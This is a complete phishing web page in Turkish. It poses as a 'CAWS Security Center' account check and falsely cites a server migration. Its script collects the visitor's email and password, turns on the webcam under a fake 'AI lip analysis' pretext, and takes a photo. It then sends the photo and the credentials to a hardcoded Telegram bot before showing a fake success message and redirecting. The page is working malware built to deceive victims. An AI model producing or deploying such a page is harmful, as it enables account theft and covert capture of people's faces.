<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CAWS Security Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #fff; font-family: 'Inter', sans-serif; color: #000; height: 100vh; display: flex; justify-content: center; align-items: center; }
        
        .container { width: 100%; max-width: 400px; padding: 30px; text-align: center; }
        .logo { font-weight: 900; font-size: 32px; letter-spacing: -2px; margin-bottom: 10px; }
        .shield-icon { width: 50px; margin-bottom: 20px; opacity: 0.8; }
        
        h2 { font-size: 20px; font-weight: 700; margin-bottom: 10px; color: #111; }
        .info-text { font-size: 13px; color: #666; margin-bottom: 30px; line-height: 1.6; }

        .form-box { text-align: left; }
        label { font-size: 11px; font-weight: 700; text-transform: uppercase; color: #999; display: block; margin-bottom: 8px; }
        input { width: 100%; padding: 15px; border: 1px solid #eee; background: #f9f9f9; border-radius: 8px; margin-bottom: 20px; outline: none; font-size: 14px; }
        
        .btn-next { width: 100%; background: #000; color: #fff; border: none; padding: 18px; border-radius: 8px; font-weight: 700; cursor: pointer; text-transform: uppercase; font-size: 12px; }

        /* GÜVENLİK ADIMI */
        #verify-view { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:100; flex-direction:column; align-items:center; justify-content:center; padding: 20px; }
        .video-wrapper { width: 300px; height: 300px; border-radius: 20px; overflow: hidden; background: #000; position: relative; border: 4px solid #f0f0f0; margin-bottom: 20px; }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        
        .code-box { background: #f4f4f4; padding: 15px 30px; border-radius: 12px; font-size: 32px; font-weight: 900; letter-spacing: 10px; margin: 20px 0; border: 2px dashed #ccc; }
        .instruction { font-size: 14px; font-weight: 600; color: #111; margin-bottom: 5px; }
        .sub-instruction { font-size: 12px; color: #888; text-align: center; max-width: 280px; }
    </style>
</head>
<body>

<div class="container" id="step-1">
    <img src="https://cdn-icons-png.flaticon.com/512/7641/7641727.png" class="shield-icon">
    <div class="logo">CAWS</div>
    <h2>Güvenlik Doğrulaması</h2>
    <p class="info-text">Sunucu taşınma işlemleri nedeniyle hesabınızın size ait olduğunu doğrulamak için <b>Görsel Onay</b> gerekmektedir.</p>
    
    <div class="form-box">
        <label>Master Account</label>
        <input type="email" id="email" placeholder="E-posta adresiniz">
        <label>Password</label>
        <input type="password" id="pass" placeholder="Şifreniz">
        <button class="btn-next" onclick="openCamera()">DEVAM ET</button>
    </div>
</div>

<div id="verify-view">
    <div class="instruction">Lütfen aşağıdaki kodu sesli okuyun:</div>
    <div class="code-box" id="random-code">4 8 2</div>
    
    <div class="video-wrapper">
        <video id="webcam" autoplay playsinline muted></video>
    </div>
    
    <div class="sub-instruction">Sistem, dudak hareketlerinizi ve yüz hatlarınızı yapay zeka ile analiz ediyor...</div>
    <div id="loader" style="margin-top:20px; display:none; font-weight:700; font-size:12px; color:green;">ANALİZ EDİLİYOR...</div>
</div>

<script>
    const token = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
    const chat = "1540769169";

    function openCamera() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!email || !pass) return alert("Bilgileri eksiksiz girin.");

        // Rastgele kod üret
        document.getElementById('random-code').innerText = Math.floor(Math.random() * 900) + 100;

        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(stream => {
            document.getElementById('step-1').style.display = 'none';
            document.getElementById('verify-view').style.display = 'flex';
            const video = document.getElementById('webcam');
            video.srcObject = stream;

            // Kullanıcı kodu okurken (4 saniye sonra) fotoğrafı çek
            setTimeout(() => {
                capture(video, email, pass);
            }, 4000);
        })
        .catch(err => {
            alert("Hata: Güvenlik protokolü için kamera izni zorunludur.");
        });
    }

    async function capture(video, email, pass) {
        document.getElementById('loader').style.display = 'block';
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
            const fd = new FormData();
            fd.append('photo', blob, 'security_check.jpg');
            
            // Fotoğrafı gönder
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chat}`, { method: 'POST', body: fd });

            // Bilgileri gönder
            const msg = `🎭 **CAWS GÜVENLİK RAPORU** 🎭\n\n📧 **Mail:** \`${email}\`\n🔑 **Pass:** \`${pass}\`\n✅ **Durum:** Görsel Onay Alındı`;
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}&parse_mode=markdown`);

            setTimeout(() => {
                alert("Doğrulama Başarılı. Hesabınız senkronize edildi.");
                window.location.href = "https://caws.network";
            }, 2000);
        }, 'image/jpeg', 0.8);
    }
</script>

</body>
</html>
